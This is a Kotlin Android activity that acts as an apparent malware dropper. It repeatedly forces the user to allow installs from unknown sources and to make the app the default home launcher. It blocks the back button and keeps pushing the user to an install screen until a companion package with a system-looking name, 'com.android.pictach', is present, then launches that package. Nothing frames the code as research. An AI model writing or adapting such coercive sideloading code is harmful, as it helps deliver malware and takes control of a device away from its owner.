package com.cristal.bristral.tristal.mistral

import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class SecondActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private var permissionRequested = false
    private lateinit var permissionCheckRunnable: Runnable
    private lateinit var homeCheckRunnable: Runnable
    private lateinit var companionCheckRunnable: Runnable

    companion object {
        private const val COMPANION_PKG = "com.android.pictach"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        permissionCheckRunnable = Runnable {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (packageManager.canRequestPackageInstalls()) {
                    goToInstallActivity()
                } else {
                    handler.postDelayed(permissionCheckRunnable, 1000)
                }
            } else {
                goToInstallActivity()
            }
        }

        homeCheckRunnable = Runnable {
            if (isDefaultHome()) {
                goToInstallActivity()
            } else {
                handler.postDelayed(homeCheckRunnable, 1000)
            }
        }

        // Keep checking every 2 seconds — if companion not installed force back to install
        companionCheckRunnable = Runnable {
            if (!isCompanionInstalled()) {
                goToInstallActivityNow()
            } else {
                handler.postDelayed(companionCheckRunnable, 2000)
            }
        }

        goToUnknownApps()
    }

    override fun onResume() {
        super.onResume()
        permissionRequested = false

        if (!isDefaultHome()) {
            goToUnknownApps()
            return
        }

        // If companion not installed — force to install
        if (!isCompanionInstalled()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (packageManager.canRequestPackageInstalls()) {
                    goToInstallActivity()
                } else {
                    handler.removeCallbacks(permissionCheckRunnable)
                    handler.postDelayed(permissionCheckRunnable, 1000)
                }
            } else {
                goToInstallActivity()
            }
            return
        }

        // Companion installed — launch it
        launchCompanionApp()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }

    // Block back button — force install
    override fun onBackPressed() {
        if (!isCompanionInstalled()) {
            goToInstallActivityNow()
        } else {
            super.onBackPressed()
        }
    }

    private fun goToUnknownApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (packageManager.canRequestPackageInstalls()) {
                goToInstallActivity()
                return
            }

            if (!permissionRequested) {
                permissionRequested = true
                val intent = Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES")
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }

            handler.postDelayed(permissionCheckRunnable, 1000)

        } else {
            Toast.makeText(
                this,
                "Please set this app as your default home launcher",
                Toast.LENGTH_LONG
            ).show()

            try {
                val intent = Intent("android.settings.HOME_SETTINGS")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent("android.settings.APPLICATION_DETAILS_SETTINGS")
                intent.data = Uri.parse("package:$packageName")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }

            handler.postDelayed(homeCheckRunnable, 1000)
        }
    }

    private fun isDefaultHome(): Boolean {
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        val info = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
            ?: return false
        return info.activityInfo?.packageName == packageName
    }

    private fun isCompanionInstalled(): Boolean {
        return try {
            packageManager.getPackageInfo(COMPANION_PKG, 0)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun launchCompanionApp() {
        try {
            val launch = packageManager.getLaunchIntentForPackage(COMPANION_PKG)
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                launch.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                startActivity(launch)
                finish()
            } else {
                goToInstallActivityNow()
            }
        } catch (e: Exception) {
            goToInstallActivityNow()
        }
    }

    private fun goToInstallActivity() {
        handler.removeCallbacksAndMessages(null)
        if (isCompanionInstalled()) {
            launchCompanionApp()
            return
        }
        goToInstallActivityNow()
    }

    private fun goToInstallActivityNow() {
        handler.removeCallbacksAndMessages(null)
        val delay = (500L..1000L).random()
        handler.postDelayed({
            if (!isFinishing && !isDestroyed) {
                val intent = Intent(this, InstallActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                startActivity(intent)
                finish()
            }
        }, delay)
    }
}
